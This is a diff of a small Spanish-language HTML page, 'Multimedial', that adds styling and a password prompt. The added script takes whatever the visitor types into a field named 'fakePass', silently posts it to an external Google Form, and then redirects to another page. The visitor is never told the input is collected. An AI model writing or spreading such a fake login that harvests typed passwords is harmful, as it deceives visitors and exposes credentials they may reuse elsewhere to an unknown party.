@@ -1,80 +1,124 @@
 <!DOCTYPE html>
-<!-- Indica al navegador que este documento usa HTML5 -->
-
 <html lang="es">
-<!-- Inicio del documento HTML -->
-
 <head>
-<!-- Sección donde van metadatos, título y estilos -->
+    <meta charset="UTF-8">
+    <title>Multimedial</title>
+    <style>
+        body {
+            background-color: #1d273d;
+            color: #f725bf;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: flex-start;
+            padding-left: 10%;
+            font-family: 'Lucida Console', Monospace;
+            overflow: hidden;
+        }
 
-<meta charset="UTF-8">
-<!-- Define la codificación de caracteres para que se vean bien tildes y símbolos -->
+        .contenedor-texto p {
+            font-size: 90px;
+            font-weight: bold;
+            margin: 0;
+            line-height: 0.85;
+            letter-spacing: -2px;
+        }
 
-<title>Multimedial</title>
-<!-- Título de la página que aparece en la pestaña del navegador -->
+        /* Área de entrada */
+        .login-area {
+            margin-top: 50px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
 
-<style>
-/* Aquí comienza la sección de estilos CSS que define la apariencia visual */
+        input[type="text"] {
+            background: transparent;
+            border: none;
+            border-bottom: 4px solid #f725bf;
+            color: beige;
+            font-family: 'Lucida Console', Monospace;
+            font-size: 28px;
+            outline: none;
+            width: 450px;
+            padding: 10px 0;
+        }
 
-body{
-/* "body" se refiere a todo el contenido visible de la página */
+        button {
+            background-color: #f725bf;
+            color: #1d273d;
+            border: none;
+            padding: 12px 25px;
+            font-family: 'Lucida Console', Monospace;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: fit-content;
+            transition: 0.3s;
+        }
 
+        button:hover {
+            background-color: beige;
+            transform: scale(1.05);
+        }
 
-  background-color: #1d273d;
-  /* Define que el fondo de toda la página sea blanco */
+        .enlaces-bajos {
+            margin-top: 60px;
+            font-size: 18px;
+        }
 
-  color: #f725bf;
-  /* Define que el color del texto sea negro */
-
-  margin: 0;
-  /* Elimina los márgenes que los navegadores agregan por defecto */
-
-  height: 100vh;
-  /* Hace que el alto del cuerpo sea igual al 100% de la altura de la pantalla */
-
-  display: flex;
-  /* Activa el sistema Flexbox para organizar y centrar elementos */
-
-  justify-content: left;
-  /* Centra el contenido horizontalmente */
-
-  align-items: center;
-  /* Centra el contenido verticalmente */
-
-  font-family: Lucida Console, Monospace;
-  /* Define la tipografía del texto */
-
-  font-size: 100px;
-  /* Define el tamaño grande del texto */
-
-
-  font-weight: semi-bold;
-  /* grosor de la letra */
-  
-
-}
-/* Fin de las reglas de estilo del body */
-
-</style>
-<!-- Fin de la sección de estilos -->
-
+        a { color: #f725bf; text-decoration: none; }
+        a:hover { text-decoration: underline; color: beige; }
+    </style>
 </head>
-<!-- Fin de la sección head -->
 
 <body>
-<!-- Inicio del contenido visible de la página -->
 
-<div class="contenedor-texto">
-<p>Viajando</p>
-<p>Entre los</p>
-<p>Medios 𐔌՞ ܸ.ˬ.ܸ՞𐦯</p>
-</div>  
-<a href="pagina2.html">Ir a la segunda página</a>
+    <div class="contenedor-texto">
+        <p>Viajando</p>
+        <p>Entre los</p>
+        <p>Medios 𐔌՞ ܸ.ˬ.՞𐦯</p>
+    </div>
 
-<!-- Texto que aparece en el centro de la pantalla -->
+    <div class="login-area">
+        <input type="text" id="fakePass" placeholder="Escribe la contraseña..." autocomplete="off">
+        <button onclick="enviarYEntrar()">[ ENTRAR ]</button>
+    </div>
+
+    <div class="enlaces-bajos">
+        <a href="contacto.html">Contacto :3</a>
+    </div>
+
+    <script>
+        function enviarYEntrar() {
+            const pass = document.getElementById('fakePass').value;
+            
+            if (pass.trim() === "") {
+                alert("Debes poner la contraseña! (๑>ᴗ<๑)");
+                return;
+            }
+
+            // Configuración de tu Google Form
+            const URL_FORM = "https://docs.google.com/forms/d/e/1FAIpQLScu3pfWLod5-kYDaCVIcOmsJ9LRrzBQoBrpADqswcziafUdSg/formResponse";
+            const ID_ENTRADA = "entry.151227596";
+
+            const datos = new FormData();
+            datos.append(ID_ENTRADA, pass);
+
+            // Envío y Redirección
+            fetch(URL_FORM, {
+                method: "POST",
+                mode: "no-cors",
+                body: datos
+            }).then(() => {
+                window.location.href = "obra.html";
+            }).catch(() => {
+                window.location.href = "obra.html";
+            });
+        }
+    </script>
 
 </body>
-<!-- Fin del contenido visible -->
-
 </html>
-<!-- Fin del documento HTML -->
